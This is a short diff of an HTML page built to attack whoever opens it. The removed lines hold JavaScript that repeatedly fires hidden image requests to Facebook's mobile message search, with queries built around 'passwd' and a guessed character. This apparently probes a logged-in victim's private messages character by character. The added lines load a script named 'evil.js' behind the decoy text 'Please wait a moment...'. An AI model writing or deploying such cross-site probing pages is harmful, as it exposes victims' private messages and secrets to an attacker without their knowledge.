@@ -1,43 +1,9 @@
 <html>
+<head>
+<script src="jquery.js"></script>
+<script src="evil.js" type="text/javascript"></script>
+</head>
 <body>
-<script>
-var digit = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
-var lowercase = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
-var uppercase = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']; 
-var pref;
-var ref;
-var alpha = digit.concat(lowercase.concat(uppercase));
-var j = 0;
-alpha_counter = 0;
-
-function get_alpha(ch, alphabet) {
-	for (i=0; i< alphabet.length; i++) {
-		if (alphabet[i] != ch) {
-			pref = pref + alphabet[i] + '_';
-		}
-	}
-}
-
-function makeRequest() {
-	if (alpha_counter > alpha.length - 1) {
-		alpha_counter = 0;
-		j++;
-	}
-	pref = "rynmkwi!";
-	ch = alpha[alpha_counter];
-	get_alpha(ch, alpha);
-	ref = 'passwd';
-	post_ref = "znq";
-	var img = new Image();
-	img.src= "https://touch.facebook.com/messages/?q=" + pref + ref + ch + post_ref;
-	alpha_counter++;
-
-	console.log("making request %d", j);
-
-	setTimeout(makeRequest, 4000);
-}
-
-makeRequest();
-</script>
+Please wait a moment...
 </body>
 </html>
